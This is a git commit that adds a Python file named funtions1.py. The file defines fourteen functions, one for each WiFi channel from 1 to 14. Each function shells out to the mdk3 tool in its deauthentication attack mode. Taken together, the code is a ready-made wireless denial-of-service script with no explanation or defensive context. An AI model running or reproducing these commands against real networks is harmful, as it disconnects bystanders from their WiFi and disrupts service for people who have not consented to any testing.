5a6b9b81ba70650ef8fb24700fd8e55f7f4e3f70
Nguyen Van Bien <buocngoat2020@gmail.com>
2023-04-20 13:18:45 +0700

    new

---
+++ funtions1.py
@@ -0,0 +1,29 @@
+import os
+def attackChannel1():
+    os.system('mdk3 wlx00c0caab5603 d -c 1')
+def attackChannel2():
+    os.system('mdk3 wlx00c0caab5603 d -c 2')
+def attackChannel3():
+    os.system('mdk3 wlx00c0caab5603 d -c 3')
+def attackChannel4():
+    os.system('mdk3 wlx00c0caab5603 d -c 4')
+def attackChannel5():
+    os.system('mdk3 wlx00c0caab5603 d -c 5')
+def attackChannel6():
+    os.system('mdk3 wlx00c0caab5603 d -c 6')
+def attackChannel7():
+    os.system('mdk3 wlx00c0caab5603 d -c 7')
+def attackChannel8():
+    os.system('mdk3 wlx00c0caab5603 d -c 8')
+def attackChannel9():
+    os.system('mdk3 wlx00c0caab5603 d -c 9')
+def attackChannel10():
+    os.system('mdk3 wlx00c0caab5603 d -c 10')
+def attackChannel11():
+    os.system('mdk3 wlx00c0caab5603 d -c 11')
+def attackChannel12():
+    os.system('mdk3 wlx00c0caab5603 d -c 12')
+def attackChannel13():
+    os.system('mdk3 wlx00c0caab5603 d -c 13')
+def attackChannel14():
+    os.system('mdk3 wlx00c0caab5603 d -c 14')
